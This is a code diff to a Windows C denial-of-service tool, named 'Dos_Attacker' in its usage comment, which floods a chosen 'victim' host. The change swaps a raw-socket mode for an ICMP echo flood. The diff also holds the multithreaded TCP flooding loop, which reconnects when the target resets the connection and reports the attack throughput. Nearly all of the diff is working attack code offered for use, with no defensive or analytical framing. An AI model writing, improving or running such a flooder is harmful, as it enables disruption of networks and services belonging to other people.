@@ -5,19 +5,13 @@
 #include <Windows.h>
 #include <conio.h>
 #include <time.h>
+#include <stdint.h>
+
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
 #pragma comment (lib, "AdvApi32.lib")
 
-void ErrChk(int code, const char* func)
-{
-	if (code == SOCKET_ERROR)
-	{
-		printf("Error %x in function %s\n", WSAGetLastError(), func);
-		exit(-1);
-	}
-}
-
+//structures
 struct DoSInfo
 {
 	char* victim;
@@ -28,98 +22,35 @@ struct DoSInfo
 	DWORD delay;
 };
 
-static size_t data = 0, pings = 0;
-static UINT exit_code = -1;
-static bool run = true, start = false;
-
-DWORD WINAPI DoSThread(LPVOID lParam)
+struct ICMP_Pkt
 {
-	const DoSInfo* info = (DoSInfo*)lParam;
-	DWORD res = 0, max_pkg_size = 65536;
-	int res_size=sizeof(DWORD);
-	long long sent = 0;
-	bool keepaliveb = true;
-	SOCKET sock = INVALID_SOCKET;
-	addrinfo* result;
-set:
-	getaddrinfo(info->victim, info->service, info->hint, &result);
-	for (addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next)
+	uint8_t type;		/* message type */
+	uint8_t code;		/* type sub-code */
+	uint16_t checksum;
+	union
 	{
-		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
-		if (sock == INVALID_SOCKET)
+		struct
 		{
-			puts("Error in creating socket");
-			return -1;
-		}
-		if (connect(sock, ptr->ai_addr, ptr->ai_addrlen) == SOCKET_ERROR)
+			uint16_t	id;
+			uint16_t	sequence;
+		} echo;			/* echo datagram */
+		uint32_t	gateway;	/* gateway address */
+		struct
 		{
-			closesocket(sock);
-			sock = INVALID_SOCKET;
-			continue;
-		}
-		break;
-	}
+			uint16_t	__unused;
+			uint16_t	mtu;
+		} frag;			/* path mtu discovery */
+	} un;
+};
 
-	if (sock == INVALID_SOCKET)
+//functions
+void ErrChk(int code, const char* func)
+{
+	if (code == SOCKET_ERROR)
 	{
-		puts("Unable to connect to the server.");
-		run = false;
+		printf("Error %u in function %s\n", WSAGetLastError(), func);
 		exit(-1);
 	}
-
-	ErrChk(getsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*)& max_pkg_size, &res_size), "getsockopt");
-	if (info->pkg_size > max_pkg_size)
-	{
-		printf("The package size that you have chose is too big...\nThe sockets of this type have a limit of %llu bytes.\n", (unsigned long long)max_pkg_size);
-		run = false;
-		exit(-1);
-	}
-	ErrChk(getsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*)& max_pkg_size, &res_size), "getsockopt");
-	if (info->pkg_size > max_pkg_size)
-	{
-		printf("The package size that you have chose is too big...\nThe sockets of this type have a limit of %llu bytes.\n", (unsigned long long)max_pkg_size);
-		run = false;
-		exit(-1);
-	}
-	ErrChk(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*) & (info->pkg_size), sizeof(DWORD)), "setsockopt");
-	ErrChk(setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*) & (info->pkg_size), sizeof(DWORD)), "setsockopt");
-
-	while (!start)Sleep(10);
-	while (run)
-	{
-		data += sent = send(sock, (char*)(info->pkg), info->pkg_size, 0);
-		pings++;
-		if (sent <= 0)
-		{
-			res = WSAGetLastError();
-			switch (res)
-			{
-			case WSAECONNABORTED:
-				puts("\nA WSAECONNABORTED error has occord.\nA software in your PC has closed the connection, or maybe the timeout passed.");
-				break;
-			case WSAECONNRESET:
-				/*
-				We try to save the day!
-				If the connection is dead, we need to create a new one!
-				*/
-				run = true;
-				goto set;
-				break;
-			case WSAECONNREFUSED:
-				puts("\nA WSAECONNREFUSED error has occord.\nThe remote host refused to the connection.");
-				break;
-			default:
-				printf("\nError \'%u\' has occord.\n", res);
-			}
-			run = false;
-			exit(-1);
-		}
-
-		if (info->delay)
-			Sleep(info->delay);
-	}
-	closesocket(sock);
-	return 0;
 }
 
 void cls(HANDLE hConsole)
@@ -172,14 +103,118 @@ void cls(HANDLE hConsole)
 	SetConsoleCursorPosition(hConsole, coordScreen);
 }
 
+//global vars for threads
+static size_t data = 0, pings = 0;
+static UINT exit_code = -1;
+static bool run = true, start = false;
+
+DWORD WINAPI DoSThread(LPVOID lParam)
+{
+	const DoSInfo* info = (DoSInfo*)lParam;
+	DWORD res = 0, max_pkg_size = 65536;
+	int res_size=sizeof(DWORD);
+	long long sent = 0;
+	bool keepaliveb = true;
+	SOCKET sock = INVALID_SOCKET;
+	addrinfo* result;
+
+set:
+	//connect
+	ErrChk(getaddrinfo(info->victim, info->service, info->hint, &result), "getaddrinfo");
+	for (addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next)
+	{
+		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+		if (sock == INVALID_SOCKET)
+		{
+			puts("Error in creating socket");
+			return -1;
+		}
+		if (connect(sock, ptr->ai_addr, ptr->ai_addrlen) == SOCKET_ERROR)
+		{
+			closesocket(sock);
+			sock = INVALID_SOCKET;
+			continue;
+		}
+		break;
+	}
+
+	if (sock == INVALID_SOCKET)
+	{
+		puts("Unable to connect to the server.");
+		run = false;
+		exit(-1);
+	}
+
+	//set
+	ErrChk(getsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*)& max_pkg_size, &res_size), "getsockopt");
+	if (info->pkg_size > max_pkg_size)
+	{
+		printf("The package size that you have chose is too big...\nThe sockets of this type have a limit of %llu bytes.\n", (unsigned long long)max_pkg_size);
+		run = false;
+		exit(-1);
+	}
+	ErrChk(getsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*)& max_pkg_size, &res_size), "getsockopt");
+	if (info->pkg_size > max_pkg_size)
+	{
+		printf("The package size that you have chose is too big...\nThe sockets of this type have a limit of %llu bytes.\n", (unsigned long long)max_pkg_size);
+		run = false;
+		exit(-1);
+	}
+	ErrChk(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*) & (info->pkg_size), sizeof(DWORD)), "setsockopt");
+	ErrChk(setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*) & (info->pkg_size), sizeof(DWORD)), "setsockopt");
+	
+	//wait...
+	while (!start)Sleep(10);//We use Sleep to keep the CPU usage low. If we won't use it, the CPU will probably be at 100%
+	//attack!
+	while (run)
+	{
+		data += sent = send(sock, (char*)info->pkg, info->pkg_size, 0);
+		pings++;
+		if (sent <= 0)
+		{
+			res = WSAGetLastError();
+			switch (res)
+			{
+			case WSAECONNABORTED:
+				puts("\nA WSAECONNABORTED error has occord.\nA software in your PC has closed the connection, or maybe the timeout passed.");
+				break;
+			case WSAECONNRESET:
+				/*
+				We try to save the day!
+				If the connection is dead, we need to create a new one!
+				*/
+				run = true;
+				goto set;
+				break;
+			case WSAECONNREFUSED:
+				puts("\nA WSAECONNREFUSED error has occord.\nThe remote host refused to the connection.");
+				break;
+			default:
+				printf("\nError \'%u\' has occord.\n", res);
+			}
+			run = false;
+			exit(-1);
+		}
+		//sleep between packets
+		if (info->delay)
+			Sleep(info->delay);
+	}
+	//we must clean at the end
+	closesocket(sock);
+	return 0;
+}
+
 DWORD WINAPI SpeedThread(LPVOID lParam)
 {
 	HANDLE outh = GetStdHandle(STD_OUTPUT_HANDLE);
-	while (!start)Sleep(10);
+	//wait...
+	while (!start)Sleep(10);//We use Sleep to keep the CPU usage low. If we won't use it, the CPU will probably be at 100%
+	//monitor the attack
 	while (run)
 	{
 		Sleep(1000);
 		cls(outh);
+		//print the speed
 		printf("Attacking: %s\nSpeed rate: %.2fMbps or %.3fMBps\nPings rate: %llu\nPress CTRL+C to stop.", (char*)lParam, (double)data * 8 / 1024 / 1024, (double)data / 1024 / 1024, pings);
 		data = 0;
 		pings = 0;
@@ -189,7 +224,7 @@ DWORD WINAPI SpeedThread(LPVOID lParam)
 
 int main(int argc, char** argv)
 {
-	//Dos_Attacker target_ip /port port OR /raw __nothing__ package_size threads delay
+	//Dos_Attacker target_ip /port port OR /icmp __nothing__ package_size threads delay
 
 	BYTE* buff = NULL;
 	//SOCKET sock = INVALID_SOCKET;
@@ -221,11 +256,11 @@ int main(int argc, char** argv)
 			return 0;
 		}
 	}
-	else if (strcmp("/raw", argv[2]) == 0 || strcmp("-raw", argv[2]) == 0 || strcmp("raw", argv[2]) == 0)
+	else if (strcmp("/icmp", argv[2]) == 0 || strcmp("-icmp", argv[2]) == 0 || strcmp("icmp", argv[2]) == 0)
 	{
 		victim.ai_family = AF_UNSPEC;
 		victim.ai_socktype = SOCK_RAW;
-		victim.ai_protocol = IPPROTO_RAW;
+		victim.ai_protocol = IPPROTO_ICMP;
 		mode_tcp = false;
 		if (argc != 6)
 		{
@@ -241,21 +276,45 @@ int main(int argc, char** argv)
 
 	if (mode_tcp)port = argv[3];
 	pkg_size = strtoul(argv[3 + mode_tcp], NULL, 10);
-	if (pkg_size <= 0 || (mode_tcp == false && pkg_size > 65507))
+	if (pkg_size <= 0 || (mode_tcp == false && pkg_size > 65467))
 	{
-		puts("Invalid package size.\nPackage size should be less than 65507 (when /raw is used) and nonzero.");
+		puts("Invalid package size.\nPackage size should be less than 65467 (when /icmp is used) and nonzero.");
 		return -1;
 	}
+
+	ErrChk(WSAStartup(MAKEWORD(2, 2), &wsa), "WSAStartup");
+	
 	buff = (BYTE*)malloc(pkg_size);
 	if (!buff)
 	{
 		puts("Allocation error.");
 		return -1;
 	}
-	buff[pkg_size - 1] = 0;
-	for (size_t l = 0; l < pkg_size-1; l++)
+	if (mode_tcp)
 	{
-		buff[l] = 'A';
+		buff[pkg_size - 1] = 0;
+		for (size_t l = 0; l < pkg_size - 1; l++)
+		{
+			buff[l] = 'A';
+		}
+	}
+	else
+	{
+		ICMP_Pkt* ipkg = (ICMP_Pkt*)buff;
+		if (ipkg == NULL)
+		{
+			puts("Allocation error.");
+			return -1;
+		}
+		//set the packet
+		ipkg->type = 8;
+		ipkg->code = 0;
+		ipkg->un.echo.sequence = 0;
+		ipkg->un.echo.id = 0;
+		ipkg->checksum = 0;
+		//set the additional data
+		for (size_t l = sizeof(ICMP_Pkt); l < pkg_size; l++)
+			buff[l] = 'A';
 	}
 
 	threads_num = strtoull(argv[4 + mode_tcp], NULL, 10);
@@ -276,14 +335,12 @@ int main(int argc, char** argv)
 	printf("You have chose to attack \'%s:%s\' with a package size of %llu, a total of %llu threads (and sockets) and a delay of %llu.\nContinue? ", argv[1], (mode_tcp) ? port : "raw", (unsigned long long)pkg_size, threads_num, (unsigned long long)delay);
 	if (getchar() != 'y')return -1;
 
-	ErrChk(WSAStartup(MAKEWORD(2, 2), &wsa), "WSAStartup");
-
-	ErrChk(getaddrinfo(argv[1], (mode_tcp) ? port : NULL, &victim, &result), "getaddrinfo");
-
+	//set the args for the threads
 	DoSInfo info = { argv[1], (mode_tcp) ? port : NULL, &victim, buff, pkg_size, delay };
 	start = false;
+	//create the monitoring thread
 	threads[0] = CreateThread(NULL, 0, SpeedThread, argv[1], 0, NULL);
-	
+	//create the attack threads
 	for (size_t l = 1; l < threads_num+1; l++)
 	{
 		threads[l] = CreateThread(NULL, 0, DoSThread, &info, 0, NULL);
